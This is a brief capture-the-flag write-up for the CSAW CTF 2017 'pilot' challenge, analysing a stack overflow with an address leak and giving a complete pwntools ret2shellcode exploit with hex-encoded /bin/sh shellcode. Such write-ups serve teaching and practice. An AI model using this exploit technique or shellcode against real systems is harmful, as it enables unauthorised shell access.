
# csaw17_pilot - CSAW CTF 2017 (Ret2Shellcode with Leak)

**Binary:** ELF 64-bit executable, stripped
**Protections:** NX enabled (but stack executable), No canary, No PIE
**Vulnerability:** read(0, input, 0x40) → overflow to saved RIP (offset 0x28)

**Analysis:**

- Program leaks input buffer address (Location:)
- Buffer is executable (rwx)
- Offset to saved RIP: 0x28 (40 bytes)
- Inject shellcode + filler + leaked buffer address → ret2shellcode → /bin/sh

**Shellcode:** pop /bin/sh syscall

**Pwntools Exploit (Python 3):**

```python
from pwn import *

p = process('./pilot')

p.recvuntil(b"[*]Location:")
leak = p.recvline().strip()
input_addr = int(leak, 16)
log.info(f"Leaked input address: {hex(input_addr)}")

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

offset = 0x28
filler = b"A" * (offset - len(shellcode))

payload = shellcode + filler + p64(input_addr)

p.recvuntil(b"[*]Command:")
p.sendline(payload)

p.interactive()
```
